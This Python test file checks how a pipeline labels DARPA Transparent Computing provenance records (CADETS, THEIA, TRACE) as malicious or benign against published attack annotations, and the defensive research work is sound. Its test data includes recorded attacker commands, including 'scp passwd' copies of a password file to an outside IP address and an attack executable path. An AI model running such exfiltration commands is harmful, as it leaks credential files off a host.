"""Published TC annotation excerpts through native Avro and fresh DuckDB files."""

import copy
import gzip
import shutil
import uuid
from pathlib import Path

import duckdb
import fastavro
from _tc_labels import nanoseconds
from test_ingest_performance import ingest

HERE = Path(__file__).parent


def test_native_process_annotations_and_inclusive_minutes(tmp_path):
    """Known process, neighborhood and object IDs produce one final label each."""
    root = tmp_path / 'tc-e3-cadets'
    (root / 'data').mkdir(parents=True)
    annotations = root / 'annotations'
    (annotations / 'orthrus/E3-CADETS').mkdir(parents=True)
    (annotations / 'threatrace/E3-CADETS').mkdir(parents=True)
    shutil.copyfile(HERE / 'fixtures/tc-labels/node_Nginx_Backdoor_06.csv', annotations / 'orthrus/E3-CADETS/node_Nginx_Backdoor_06.csv')
    shutil.copyfile(HERE / 'fixtures/tc-labels/neighborhood.txt', annotations / 'threatrace/E3-CADETS/ground_truth.txt')
    shutil.copyfile(HERE / 'fixtures/tc-labels/original-reapr.csv', annotations / 'original-reapr.csv')
    # Empty converted annotations must add no UUID, and another release's
    # annotation must not change a native process's label.
    (annotations / 'reapr/E3-CADETS').mkdir(parents=True)
    (annotations / 'reapr/E3-CADETS/node_Nginx_Backdoor_06.csv').write_text('')
    (annotations / 'threatrace/E5-CADETS').mkdir(parents=True)
    (annotations / 'threatrace/E5-CADETS/ground_truth.txt').write_text(str(uuid.UUID(int=600)) + '\n')
    (annotations / 'orthrus/E5-CADETS').mkdir(parents=True)
    (annotations / 'orthrus/E5-CADETS/node_Nginx_Backdoor_06.csv').write_text(f"{uuid.UUID(int=500)},{{'subject': 'uname'}},1\n")
    with gzip.open(HERE / 'fixtures/trace-no-args.bin.gz', 'rb') as stream:
        reader = fastavro.reader(stream, return_record_name=True)
        schema = reader.writer_schema
    schema['fields'].append({'name': 'sessionNumber', 'type': 'int', 'default': 0})
    with gzip.open(HERE / 'fixtures/fivedirections-images.bin.gz', 'rb') as stream:
        event = next(fastavro.reader(stream, return_record_name=True))
    # Independent UTC timestamps: 15:20 UTC through 16:09:59.999999999 UTC.
    first = 1523028000000000000
    last = 1523030999999999999
    positive = uuid.UUID('D3822AFC-39AF-11E8-BF66-D9AA8AFF4A69').bytes
    host = uuid.UUID('83c8ed1f-5045-dbcd-b39f-918f0df4f851').bytes
    neighborhood = uuid.UUID((HERE / 'fixtures/tc-labels/neighborhood.txt').read_text().strip()).bytes
    file_uuid = uuid.UUID('F77E454D-CA07-6B5D-87CA-9EFDCD6BA3ED').bytes
    network_uuid = uuid.UUID('60040266-39AE-11E8-BF66-D9AA8AFF4A69').bytes
    raw = uuid.UUID('509F9BDF-3DBB-11E8-B8CE-15D78AC88FB6').bytes
    cases = [
        (positive, first - 1, 'before', 'unknown'),
        (positive, first, 'start', 'malicious'),
        (positive, last, 'end', 'malicious'),
        (positive, last + 1, 'after', 'unknown'),
        ((500).to_bytes(16, 'big'), first, 'concurrent', 'malicious-group'),
        (neighborhood, first - 1, 'neighborhood', 'malicious-group'),
        (file_uuid, first, 'object-is-not-process', 'malicious-group'),
        ((501).to_bytes(16, 'big'), first, 'object-process', 'malicious'),
        (raw, nanoseconds('2018-04-11 15:08:00', 'US/Eastern'), 'raw-contaminated', 'malicious'),
        ((502).to_bytes(16, 'big'), last + 120_000_000_000, 'continuing-connection', 'malicious'),
        ((600).to_bytes(16, 'big'), first - 1, 'other-release', 'unknown'),
        ((501).to_bytes(16, 'big'), last + 120_000_000_000, 'later-file-reader', 'unknown'),
    ]
    rows = []
    for index, (process, timestamp, marker, label) in enumerate(cases):
        row = copy.deepcopy(event)
        record = row['datum'][1]
        record.update(uuid=(1000 + index).to_bytes(16, 'big'), type='EVENT_EXECUTE', hostId=host,
                      subject=('com.bbn.tc.schema.avro.cdm18.UUID', process),
                      timestampNanos=timestamp, predicateObject=None,
                      properties={'cmdLine': 'uname ' + marker})
        rows.append(row)
    relation = copy.deepcopy(event)
    relation['datum'][1].update(type='EVENT_READ', hostId=host, subject=('com.bbn.tc.schema.avro.cdm18.UUID', (501).to_bytes(16, 'big')),
                               predicateObject=('com.bbn.tc.schema.avro.cdm18.UUID', file_uuid), timestampNanos=first, properties={})
    rows.append(relation)
    later_file = copy.deepcopy(relation)
    later_file['datum'][1]['timestampNanos'] = last + 180_000_000_000
    rows.append(later_file)
    observation_only = copy.deepcopy(relation)
    observation_only['datum'][1].update(uuid=(9050).to_bytes(16, 'big'),
                                      subject=('com.bbn.tc.schema.avro.cdm18.UUID', (505).to_bytes(16, 'big')),
                                      properties={'cmdLine': 'uname not-an-execution'})
    rows.append(observation_only)
    # Related events may arrive out of timestamp order. A continuing connection
    # extends only its identified process, never every command on the host.
    for timestamp in [last + 180_000_000_000, first]:
        network = copy.deepcopy(relation)
        network['datum'][1].update(type='EVENT_CONNECT', timestampNanos=timestamp,
                                  subject=('com.bbn.tc.schema.avro.cdm18.UUID', (502).to_bytes(16, 'big')),
                                  predicateObject=('com.bbn.tc.schema.avro.cdm18.UUID', network_uuid))
        rows.append(network)
    other_host = copy.deepcopy(rows[1])
    other_host['datum'][1].update(hostId=(9000).to_bytes(16, 'big'), uuid=(9001).to_bytes(16, 'big'), properties={'cmdLine': 'uname other-host'})
    rows.append(other_host)
    cases.append((positive, first, 'other-host', 'unknown'))
    other_restart = copy.deepcopy(rows[7])
    other_restart['sessionNumber'] = 9
    other_restart['datum'][1].update(uuid=(9002).to_bytes(16, 'big'), properties={'cmdLine': 'uname other-restart'})
    rows.append(other_restart)
    cases.append(((501).to_bytes(16, 'big'), first, 'other-restart', 'malicious-group'))
    with (root / 'data/annotations.bin').open('wb') as stream:
        fastavro.writer(stream, schema, rows)
    database = tmp_path / 'commands.duckdb'
    result = ingest(root, database, 'from _ingest_tc import records\n')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        before = con.execute('SELECT * FROM COMMANDS ORDER BY record_id').fetchall()
        actual = con.execute('SELECT args[1],label,group_id FROM COMMANDS ORDER BY rowid').fetchall()
        assert [(marker, label) for marker, label, _ in actual] == [(row[2], row[3]) for row in cases], 'Annotation IDs must be joined with native process identity and correctly zoned complete minutes'
        assert all((group is not None) == (label == 'malicious-group') for _, label, group in actual)
        assert 'threatrace-process-set' in actual[5][2]
        assert 'attack-day' not in actual[4][2]
    result = ingest(root, database, 'from _ingest_tc import records\n')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT * FROM COMMANDS ORDER BY record_id').fetchall() == before


def test_original_cadets_attack_execution(tmp_path):
    """The original April 6 attack executable joins its published UUID annotation."""
    root = tmp_path / 'tc-e3-cadets'
    (root / 'data').mkdir(parents=True)
    directory = root / 'annotations/orthrus/E3-CADETS'
    directory.mkdir(parents=True)
    shutil.copyfile(HERE / 'fixtures/cadets-attack.bin.gz', root / 'data/attack.bin.gz')
    shutil.copyfile(HERE / 'fixtures/tc-labels/node_Nginx_Backdoor_06.csv', directory / 'node_Nginx_Backdoor_06.csv')
    database = tmp_path / 'attack.duckdb'
    result = ingest(root, database, 'from _ingest_tc import records\n')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT pgm,args,label,group_id FROM COMMANDS').fetchall() == [('/tmp/vUgefal', ['BBBB'], 'malicious', None)], 'Original CADETS UUID and Eastern attack window must agree through native decoding'


def test_failed_execution_and_report_benign_setup(tmp_path):
    """Failed attacker launches remain malicious; explicitly benign setup is scoped."""
    with gzip.open(HERE / 'fixtures/fivedirections-images.bin.gz', 'rb') as stream:
        reader = fastavro.reader(stream, return_record_name=True)
        native = list(reader)
        schema = reader.writer_schema
    for dataset, filename, host, text, target, timestamp, expected in [
        ('tc-e3-theia', 'failed.bin', '0a00063c-5254-00f0-0d60-000000000070', None,
         '/home/admin/Desktop/tcexec', '2018-04-13 14:04:00', 'malicious'),
        ('tc-e5-theia', 'ta1-theia-3-e5.bin', '00000000-0000-0000-0000-000000000001',
         'insmod load_helper_theia.ko', None, '2019-05-14 20:32:00', 'benign'),
        ('tc-e5-theia', 'ta1-theia-1-e5.bin', '00000000-0000-0000-0000-000000000001',
         'insmod load_helper_theia.ko', None, '2019-05-14 20:32:00', 'unknown'),
        ('tc-e5-trace', 'ta1-trace-2-e5.bin', '00000000-0000-0000-0000-000000000002',
         'scp passwd admin@128.55.12.149:.', None, '2019-05-10 14:30:00', 'malicious'),
        ('tc-e5-trace', 'ta1-trace-1-e5.bin', '00000000-0000-0000-0000-000000000002',
         'scp passwd admin@128.55.12.149:.', None, '2019-05-10 14:30:00', 'unknown'),
        ('tc-e5-fivedirections', 'ta1-fivedirections-3-e5.bin', '00000000-0000-0000-0000-000000000003',
         r'C:\WINDOWS\System32\OpenSSH\SCP.EXE passwd admin@128.55.12.149', None,
         '2019-05-10 14:50:00', 'malicious'),
    ]:
        root = tmp_path / filename / dataset
        (root / 'data').mkdir(parents=True)
        row = copy.deepcopy(native[0])
        row['datum'][1].update(type='EVENT_EXECUTE', hostId=uuid.UUID(host).bytes,
                              predicateObjectPath=target, timestampNanos=nanoseconds(timestamp, 'US/Eastern'),
                              properties={'cmdLine': text} if text else {})
        with (root / 'data' / filename).open('wb') as stream:
            fastavro.writer(stream, schema, [row])
        database = root / 'commands.duckdb'
        result = ingest(root, database, 'from _ingest_tc import records\n')
        assert result.returncode == 0, result.stderr
        with duckdb.connect(str(database)) as con:
            assert con.execute('SELECT label,group_id FROM COMMANDS').fetchall() == [(expected, None)], f'Report annotation must match the correct target instance for {filename}'
